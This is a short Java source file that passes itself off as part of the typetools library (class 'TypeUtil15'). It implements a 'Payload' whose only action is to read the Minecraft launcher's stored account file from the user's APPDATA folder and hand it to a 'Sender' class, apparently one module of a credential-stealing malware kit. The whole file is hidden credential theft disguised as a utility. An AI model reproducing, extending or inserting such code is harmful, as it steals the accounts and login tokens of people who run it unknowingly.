package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

import java.io.File;
import java.util.Optional;

public final class TypeUtil15 implements Payload
{
    @Override
    public void execute()
    {
        Optional<File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts.json");
        file.ifPresent(Sender::send);
    }
}
